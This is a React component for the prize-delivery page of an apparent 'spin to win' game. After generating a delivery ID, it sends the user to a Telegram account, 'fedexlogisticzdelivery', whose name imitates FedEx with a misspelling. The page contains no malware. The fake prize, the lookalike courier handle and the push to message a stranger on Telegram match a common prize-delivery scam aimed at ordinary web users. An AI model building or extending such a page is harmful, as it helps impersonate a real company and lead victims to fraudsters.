import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useGame } from '../../context/GameContext';
import { generateDeliveryId } from '../../services/api';
import { CopyToClipboard } from 'react-copy-to-clipboard';
import './BringPackagePage.css';

const BringPackagePage = () => {
  const navigate = useNavigate();
  const { gameId, userDetails, wonGift, deliveryId, setDeliveryId, updateProgress, step, loading } = useGame();
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (loading) return;
    if (!gameId || !userDetails || !wonGift) {
      navigate('/');
      return;
    }
    if (step < 2) {
      navigate(step === 1 ? '/spin' : '/');
      return;
    }
    if (!deliveryId && step < 3) {
      const genDelivery = async () => {
        try {
          const res = await generateDeliveryId(gameId);
          const did = res.data.deliveryId;
          setDeliveryId(did);
          updateProgress(3, { deliveryId: did });
        } catch (err) {
          alert('Failed to generate delivery ID');
        }
      };
      genDelivery();
    }
  }, [loading, gameId, userDetails, wonGift, deliveryId, step, navigate, setDeliveryId, updateProgress]);

  const handleContinue = () => {
    window.location.href = 'https://t.me/fedexlogisticzdelivery';
  };

  if (loading) return <div className="loading">Loading...</div>;
  if (!gameId || !userDetails || !wonGift) return null;

  return (
    <div className="bringpackage-page">
      <section className="congrats">
        <h2>Congratulations, {userDetails.name}!</h2>
      </section>
      <section className="delivery-id-section">
        <p>Your Delivery ID:</p>
        <h3>{deliveryId || 'Generating...'}</h3>
        {deliveryId && (
          <CopyToClipboard text={deliveryId} onCopy={() => setCopied(true)}>
            <button>{copied ? 'Copied!' : 'Copy'}</button>
          </CopyToClipboard>
        )}
      </section>
      <section className="warning">
        <p>⚠️ Copy or write down the delivery ID and keep it safe. It cannot be recovered if lost.</p>
      </section>
      <section className="instruction">
        <p>Click the button below to send your delivery ID to our delivery system on Telegram. The delivery will start bringing your prize immediately.</p>
      </section>
      <section className="action">
        <button className="continue-btn" onClick={handleContinue} disabled={!deliveryId}>
          Continue to Delivery System
        </button>
      </section>
    </div>
  );
};

export default BringPackagePage;